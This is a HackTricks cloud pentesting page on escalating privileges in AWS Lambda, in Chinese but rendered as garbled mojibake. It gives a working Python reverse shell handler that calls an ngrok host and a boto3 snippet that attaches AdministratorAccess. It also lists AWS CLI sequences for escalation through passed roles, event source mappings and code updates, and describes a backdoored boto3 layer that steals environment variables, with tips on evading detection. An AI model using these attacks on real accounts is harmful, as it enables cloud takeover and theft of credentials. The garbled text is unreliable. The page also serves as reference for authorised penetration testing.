# AWS - Lambdaç‰¹æƒå‡çº§

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## lambda

æœ‰å…³lambdaçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ï¼š

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`ï¼Œ`lambda:CreateFunction`ï¼Œ(`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

å…·æœ‰**`iam:PassRole`ï¼Œ`lambda:CreateFunction`**å’Œ**`lambda:InvokeFunction`**æƒé™çš„ç”¨æˆ·å¯ä»¥é€šè¿‡å°†ç°æœ‰IAMè§’è‰²ä¼ é€’ç»™æ–°çš„Lambdaå‡½æ•°æ¥**æå‡ç‰¹æƒ**ï¼Œè¯¥å‡½æ•°åŒ…æ‹¬å¯¼å…¥ç›¸å…³AWSåº“åˆ°ä»–ä»¬é€‰æ‹©çš„ç¼–ç¨‹è¯­è¨€çš„ä»£ç ï¼Œç„¶åä½¿ç”¨å®ƒæ‰§è¡Œä»–ä»¬é€‰æ‹©çš„æ“ä½œã€‚ç„¶åï¼Œå¯ä»¥é€šè¿‡AWS APIè°ƒç”¨å‡½æ•°æ¥è¿è¡Œä»£ç ã€‚

æ”»å‡»è€…å¯ä»¥æ»¥ç”¨æ­¤åŠŸèƒ½æ¥è·å–**åå‘shellå¹¶çªƒå–ä»¤ç‰Œ**ï¼š

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
æ‚¨è¿˜å¯ä»¥ä»Lambdaå‡½æ•°æœ¬èº«æ»¥ç”¨Lambdaè§’è‰²æƒé™ã€‚å¦‚æœLambdaè§’è‰²å…·æœ‰è¶³å¤Ÿçš„æƒé™ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æˆäºˆæ‚¨ç®¡ç†å‘˜æƒé™ï¼š
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**æ½œåœ¨å½±å“ï¼š**ç›´æ¥å‡çº§åˆ°æŒ‡å®šçš„ä»»æ„LambdaæœåŠ¡è§’è‰²ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œå³ä½¿**`lambda:InvokeAsync`**çœ‹èµ·æ¥å¾ˆæœ‰è¶£ï¼Œä½†å®ƒæœ¬èº«å¹¶ä¸èƒ½æ‰§è¡Œ**`aws lambda invoke-async`**å‘½ä»¤ï¼Œæ‚¨è¿˜éœ€è¦`lambda:InvokeFunction`æƒé™ã€‚
{% endhint %}

### `iam:PassRole`ï¼Œ`lambda:CreateFunction`ï¼Œ`lambda:AddPermission`

ä¸ä¹‹å‰çš„æƒ…å†µç±»ä¼¼ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰**`lambda:AddPermission`**æƒé™ï¼Œæ‚¨å¯ä»¥é€šè¿‡å®ƒæ¥æˆäºˆè‡ªå·±**`lambda:InvokeFunction`**æƒé™ã€‚
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡åˆ°æŒ‡å®šçš„ä»»æ„LambdaæœåŠ¡è§’è‰²ã€‚

### `iam:PassRole`ï¼Œ`lambda:CreateFunction`ï¼Œ`lambda:CreateEventSourceMapping`

ä¸€ä¸ªæ‹¥æœ‰**`iam:PassRole`ï¼Œ`lambda:CreateFunction`å’Œ`lambda:CreateEventSourceMapping`**ï¼ˆå¯èƒ½è¿˜æœ‰`dynamodb:PutItem`å’Œ`dynamodb:CreateTable`ï¼‰æƒé™ï¼Œä½†**æ²¡æœ‰**`lambda:InvokeFunction`æƒé™çš„ç”¨æˆ·ï¼Œå¯ä»¥é€šè¿‡**å°†ç°æœ‰IAMè§’è‰²ä¼ é€’ç»™æ–°çš„Lambdaå‡½æ•°**æ¥æå‡æƒé™ï¼Œè¯¥å‡½æ•°åŒ…å«å¯¼å…¥ç›¸å…³AWSåº“åˆ°ä»–ä»¬é€‰æ‹©çš„ç¼–ç¨‹è¯­è¨€çš„ä»£ç ï¼Œç„¶åä½¿ç”¨å®ƒæ‰§è¡Œä»–ä»¬é€‰æ‹©çš„æ“ä½œã€‚ç„¶åï¼Œä»–ä»¬éœ€è¦**åˆ›å»ºä¸€ä¸ªDynamoDBè¡¨æˆ–ä½¿ç”¨ç°æœ‰è¡¨**ï¼Œä¸ºLambdaå‡½æ•°åˆ›å»ºä¸€ä¸ªæŒ‡å‘è¯¥DynamoDBè¡¨çš„äº‹ä»¶æºæ˜ å°„ã€‚ç„¶åï¼Œä»–ä»¬éœ€è¦å°†ä¸€ä¸ªé¡¹ç›®æ”¾å…¥è¡¨ä¸­ï¼Œæˆ–è€…ç­‰å¾…å¦ä¸€ç§æ–¹æ³•æ¥æ‰§è¡Œæ­¤æ“ä½œï¼Œä»¥ä¾¿**è§¦å‘Lambdaå‡½æ•°**ã€‚
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
åœ¨pythonæ–‡ä»¶ä¸­ï¼Œä»£ç å°†åˆ©ç”¨ç›®æ ‡è§’è‰²ã€‚ä¸€ä¸ªä¾‹å­æ˜¯ä½¿ç”¨å‰é¢æ–¹æ³•ä¸­ç›¸åŒçš„è„šæœ¬ã€‚

æ¥ä¸‹æ¥çš„æ­¥éª¤å–å†³äºå½“å‰AWSç¯å¢ƒä¸­æ˜¯å¦ä½¿ç”¨DynamoDBã€‚å¦‚æœä½¿ç”¨äº†DynamoDBï¼Œåªéœ€è¦ä¸ºLambdaå‡½æ•°åˆ›å»ºäº‹ä»¶æºæ˜ å°„ï¼›ä½†å¦‚æœæ²¡æœ‰ä½¿ç”¨ï¼Œåˆ™æ”»å‡»è€…éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªå¯ç”¨äº†æµå¼ä¼ è¾“çš„è¡¨ï¼š
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
åœ¨è¿™ä¸ªå‘½ä»¤ä¹‹åï¼Œæ”»å‡»è€…å°†é€šè¿‡ä»¥ä¸‹å‘½ä»¤**åˆ›å»ºä¸€ä¸ªäº‹ä»¶æºæ˜ å°„**ï¼Œæ¥**è¿æ¥Lambdaå‡½æ•°å’ŒDynamoDBè¡¨**ï¼š
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
ç°åœ¨ï¼ŒLambdaå‡½æ•°å’Œæµå·²ç»è¿æ¥èµ·æ¥ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è§¦å‘DynamoDBæµæ¥è°ƒç”¨Lambdaå‡½æ•°ã€‚å¯ä»¥é€šè¿‡å°†é¡¹ç›®æ”¾å…¥DynamoDBè¡¨ä¸­æ¥è§¦å‘æµï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®Œæˆï¼š
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
åœ¨è¿™ä¸€ç‚¹ä¸Šï¼ŒLambdaå‡½æ•°å°†è¢«è°ƒç”¨ï¼Œæ”»å‡»è€…å°†æˆä¸ºAWSè´¦æˆ·çš„ç®¡ç†å‘˜ã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡åˆ°æŒ‡å®šçš„LambdaæœåŠ¡è§’è‰²ã€‚

### `lambda:AddPermission`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥**æˆäºˆè‡ªå·±ï¼ˆæˆ–ä»–äººï¼‰ä»»ä½•æƒé™**ï¼ˆè¿™å°†ç”ŸæˆåŸºäºèµ„æºçš„ç­–ç•¥ä»¥æˆäºˆå¯¹èµ„æºçš„è®¿é—®æƒé™ï¼‰ï¼š

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š**é€šè¿‡æˆäºˆä¿®æ”¹ä»£ç å’Œè¿è¡Œä»£ç çš„æƒé™ï¼Œç›´æ¥æå‡åˆ°lambdaæœåŠ¡è§’è‰²ã€‚

### `lambda:AddLayerVersionPermission`

æ‹¥æœ‰æ­¤æƒé™çš„æ”»å‡»è€…å¯ä»¥**æˆäºˆè‡ªå·±ï¼ˆæˆ–ä»–äººï¼‰`lambda:GetLayerVersion`æƒé™**ã€‚ä»–å¯ä»¥è®¿é—®è¯¥å±‚å¹¶æœç´¢æ¼æ´æˆ–æ•æ„Ÿä¿¡æ¯ã€‚

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**æ½œåœ¨å½±å“ï¼š**å¯èƒ½è®¿é—®æ•æ„Ÿä¿¡æ¯ã€‚

### `lambda:UpdateFunctionCode`

æ‹¥æœ‰ **`lambda:UpdateFunctionCode`** æƒé™çš„æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¯¥æƒé™**æ›´æ–°é™„æœ‰ IAM è§’è‰²çš„ç°æœ‰ Lambda å‡½æ•°çš„ä»£ç **ï¼Œä»¥ä¾¿åœ¨è¯¥ç¼–ç¨‹è¯­è¨€ä¸­å¯¼å…¥ç›¸å…³çš„ AWS åº“å¹¶ä½¿ç”¨å®ƒä»£è¡¨è¯¥è§’è‰²æ‰§è¡Œæ“ä½œã€‚ç„¶åï¼Œå¦‚æœæ”»å‡»è€…æ— æ³•ç›´æ¥è°ƒç”¨è¯¥å‡½æ•°ï¼Œä»–ä»¬éœ€è¦**ç­‰å¾…å®ƒè¢«è°ƒç”¨**ï¼Œä½†å¦‚æœè¯¥å‡½æ•°å·²ç»å­˜åœ¨ï¼Œå¾ˆå¯èƒ½æœ‰æŸç§æ–¹å¼ä¼šè°ƒç”¨å®ƒã€‚
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
å½“ç›¸å…³çš„**.zipæ–‡ä»¶åŒ…å«ä½¿ç”¨Lambdaè§’è‰²çš„ä»£ç **æ—¶ã€‚ä¸€ä¸ªä¾‹å­å¯ä»¥åŒ…æ‹¬å…ˆå‰æ–¹æ³•ä¸­çš„ä»£ç ç‰‡æ®µã€‚

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡åˆ°ä½¿ç”¨çš„lambdaæœåŠ¡è§’è‰²ã€‚

### `lambda:UpdateFunctionConfiguration`

#### ä»‹ç»

[**Lambdaå±‚**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html)å…è®¸åœ¨lambdaå‡½æ•°ä¸­åŒ…å«**ä»£ç **ï¼Œä½†å°†å…¶**åˆ†å¼€å­˜å‚¨**ï¼Œå› æ­¤å‡½æ•°ä»£ç å¯ä»¥ä¿æŒè¾ƒå°ï¼Œ**å¤šä¸ªå‡½æ•°å¯ä»¥å…±äº«ä»£ç **ã€‚

åœ¨lambdaä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡½æ•°æ£€æŸ¥åŠ è½½pythonä»£ç çš„è·¯å¾„ï¼š
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
ä»¥ä¸‹æ˜¯ä½ç½®ï¼š

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

ä¾‹å¦‚ï¼Œåº“boto3ä»`/var/runtime/boto3`ï¼ˆç¬¬4ä¸ªä½ç½®ï¼‰åŠ è½½ã€‚

#### åˆ©ç”¨

**å°†å±‚é™„åŠ åˆ°å‡½æ•°**åªéœ€è¦`lambda:UpdateFunctionConfiguration`æƒé™ï¼Œ**å±‚å¯ä»¥åœ¨ä¸åŒè´¦æˆ·ä¹‹é—´å…±äº«**ã€‚æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“**ä»–ä»¬æ­£åœ¨ä½¿ç”¨å“ªäº›åº“**ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥æ­£ç¡®åœ°è¦†ç›–å®ƒä»¬ï¼Œä½†åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†**å‡è®¾è¢«æ”»å‡»çš„å‡½æ•°æ­£åœ¨å¯¼å…¥boto3**ã€‚

ä¸ºäº†å®‰å…¨èµ·è§ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨Pipå®‰è£…ä¸æˆ‘ä»¬ç›®æ ‡å‡½æ•°ç›¸åŒç‰ˆæœ¬çš„boto3åº“ï¼ˆPython 3.7ï¼‰ï¼Œä»¥ç¡®ä¿ç›®æ ‡å‡½æ•°ä¸­æ²¡æœ‰ä»»ä½•å¯èƒ½å¼•èµ·é—®é¢˜çš„å·®å¼‚ã€‚è¯¥è¿è¡Œæ—¶ç›®å‰ä½¿ç”¨çš„æ˜¯boto3ç‰ˆæœ¬1.9.42ã€‚

ä½¿ç”¨ä»¥ä¸‹ä»£ç ï¼Œæˆ‘ä»¬å°†boto3ç‰ˆæœ¬1.9.42åŠå…¶ä¾èµ–é¡¹å®‰è£…åˆ°æœ¬åœ°çš„"lambda\_layer"æ–‡ä»¶å¤¹ä¸­ï¼š
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†æ‰“å¼€`/lambda_layer/boto3/__init__.py`å¹¶æ·»åŠ æ¶æ„ä»£ç ã€‚æˆ‘ä»¬è¦æ·»åŠ çš„æœ‰æ•ˆè½½è·å¦‚ä¸‹æ‰€ç¤ºï¼š

![](<../../../.gitbook/assets/image (26).png>)

`requests`æ˜¯ä»`botocore`ä¸­å¯¼å…¥çš„ã€‚è¯¥å‡½æ•°å°†çªƒå–ç¯å¢ƒå˜é‡ï¼Œå¹¶ä¸”try-exceptå’Œ0.1ç§’çš„è¶…æ—¶æ˜¯ä¸ºäº†ç¡®ä¿æ­¤ä»£ç ä¸ä¼šç ´åä»»ä½•ä¸œè¥¿ã€‚

{% hint style="info" %}
**é‡è¦æç¤ºï¼š**åœ¨çœŸæ­£çš„æ¸—é€æµ‹è¯•ä¸­ï¼Œæ‚¨ä¸åº”å†ä½¿ç”¨`from botocore.vendored import requests`ï¼Œå› ä¸ºè¿™å°†åœ¨è¯¥å‡½æ•°çš„CloudWatchæ—¥å¿—ä¸­æ‰“å°â€œDeprecationWarningâ€ï¼Œè¿™å¯èƒ½å¯¼è‡´æ‚¨è¢«é˜²å¾¡è€…å‘ç°ã€‚
{% endhint %}

ç°åœ¨ï¼Œå°†è¯¥ä»£ç æ‰“åŒ…æˆä¸€ä¸ª**ZIPæ–‡ä»¶**å¹¶**ä¸Šä¼ **åˆ°æ”»å‡»è€…è´¦æˆ·ä¸­çš„**æ–°Lambdaå±‚**ã€‚æ‚¨éœ€è¦é¦–å…ˆåˆ›å»ºä¸€ä¸ªâ€œpythonâ€æ–‡ä»¶å¤¹ï¼Œå¹¶å°†æ‚¨çš„åº“æ”¾åœ¨å…¶ä¸­ï¼Œä»¥ä¾¿ä¸€æ—¦æˆ‘ä»¬å°†å…¶ä¸Šä¼ åˆ°Lambdaï¼Œä»£ç å°†åœ¨â€œ/opt/python/boto3â€ä¸­æ‰¾åˆ°ã€‚æ­¤å¤–ï¼Œè¯·ç¡®ä¿è¯¥å±‚ä¸Python 3.7å…¼å®¹ï¼Œå¹¶ä¸”**è¯¥å±‚ä¸æˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°ä½äºåŒä¸€åŒºåŸŸ**ã€‚å®Œæˆåï¼Œæˆ‘ä»¬å°†ä½¿ç”¨`lambda:AddLayerVersionPermission`æ¥**ä½¿è¯¥å±‚å…¬å¼€å¯è®¿é—®**ï¼Œä»¥ä¾¿æˆ‘ä»¬çš„ç›®æ ‡è´¦æˆ·å¯ä»¥ä½¿ç”¨å®ƒã€‚åœ¨æ­¤APIè°ƒç”¨ä¸­ä½¿ç”¨æ‚¨çš„ä¸ªäººAWSå‡­æ®ã€‚
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
ç°åœ¨æˆ‘ä»¬æ‹¥æœ‰è¢«å…¥ä¾µçš„å‡­è¯ï¼Œæˆ‘ä»¬å°†åœ¨ç›®æ ‡Lambdaå‡½æ•°â€œs3-getterâ€ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œè¿™å°†é™„åŠ æˆ‘ä»¬çš„è·¨è´¦æˆ·Lambdaå±‚ã€‚
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
ä¸‹ä¸€æ­¥è¦ä¹ˆæ˜¯æˆ‘ä»¬è‡ªå·±**è°ƒç”¨å‡½æ•°**ï¼ˆå¦‚æœæˆ‘ä»¬å¯ä»¥çš„è¯ï¼‰ï¼Œè¦ä¹ˆç­‰å¾…å®ƒè¢«æ­£å¸¸æ–¹å¼è°ƒç”¨â€”â€”è¿™æ˜¯æ›´å®‰å…¨çš„æ–¹æ³•ã€‚

åœ¨ä»¥ä¸‹ä½ç½®å¯ä»¥æ‰¾åˆ°ä¸€ç§**æ›´éšè”½çš„åˆ©ç”¨æ­¤æ¼æ´çš„æ–¹æ³•**ï¼š

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**æ½œåœ¨å½±å“ï¼š**ç›´æ¥æå‡åˆ°ä½¿ç”¨çš„LambdaæœåŠ¡è§’è‰²ã€‚

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

ä¹Ÿè®¸æœ‰äº†è¿™äº›æƒé™ï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªå‡½æ•°å¹¶é€šè¿‡è°ƒç”¨URLæ¥æ‰§è¡Œå®ƒ...ä½†æˆ‘æ‰¾ä¸åˆ°æµ‹è¯•çš„æ–¹æ³•ï¼Œæ‰€ä»¥å¦‚æœæ‚¨æ‰¾åˆ°äº†ï¼Œè¯·å‘Šè¯‰æˆ‘ï¼

### Lambdaä¸­é—´äººæ”»å‡»

ä¸€äº›Lambdaå‡½æ•°å°†ä»ç”¨æˆ·çš„å‚æ•°ä¸­**æ¥æ”¶æ•æ„Ÿä¿¡æ¯**ã€‚å¦‚æœåœ¨å…¶ä¸­ä¸€ä¸ªå‡½æ•°ä¸­è·å¾—äº†RCEï¼Œæ‚¨å¯ä»¥çªƒå–å…¶ä»–ç”¨æˆ·å‘é€ç»™å®ƒçš„ä¿¡æ¯ï¼Œè¯·åœ¨ä»¥ä¸‹ä½ç½®æ£€æŸ¥ï¼š

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„åŠ¨æ€ ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
